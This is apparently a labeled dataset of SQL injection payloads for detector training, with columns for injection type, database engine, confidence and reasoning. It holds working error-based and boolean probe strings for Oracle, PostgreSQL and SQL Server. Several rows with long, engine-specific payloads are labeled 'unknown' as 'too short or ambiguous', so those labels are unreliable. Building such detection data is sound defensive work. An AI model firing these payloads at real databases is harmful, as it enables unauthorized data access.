id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
36344,"select * from users WHERE username = ""1\'+ ( select \'iqxn\' where 1146 = 1146 and username = ""-6036 ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36345,"select * from users WHERE username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'ajka\' = \'ajka"" or username = ""-4322\' ) ) as magw where 1627 = 1627",error_based,oracle,1.0,"Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: select * from users WHERE username = ""1\' ) ) and 3754 = ( s",3
36346,1\' ) where 2511 = 2511 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36347,"select * from users WHERE username = ""1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-3978 or username = ""-3899\' ) where 8152 = 8152",error_based,oracle,1.0,"Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: select * from users WHERE username = ""1"" and 3754 = ( select",3
36348,"select * from users WHERE username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-7874 ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,oracle,1.0,"Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: select * from users WHERE username = ""-2756\' where 6156 = 6",3
36349,"select * from users WHERE username = ""-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\' ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36350,"select * from users WHERE username = ""1\'|| ( select \'vasx\' where 4770 = 4770 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'"" and username = ""1",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36351,"select * from users WHERE username = ""-6792 ) ) as zlho where 4758 = 4758 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --"" or username = ""1 ) ) as atiy where 3855 = 3855",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36352,"-7323%"" and username = ""-5585\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ",error_based,oracle,1.0,"Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: -7323%"" and username = ""-5585\' or 4144 = ( select upper ( x",3
36353,"select * from users WHERE username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'yxpi\' = \'yxpi"" and username = ""-5152\' ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36354,"select * from users WHERE username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""1\'+ ( select vohg where 6383 = 6383",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36355,"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 and username = ""-5863"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",error_based,oracle,1.0,"Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: select * from users WHERE username = ""-6190\' ) where 2621 =",3
36356,"select * from users WHERE username = ""1\' ) where 2511 = 2511 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-8828 ) ) as ospo where 2141 = 2141",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
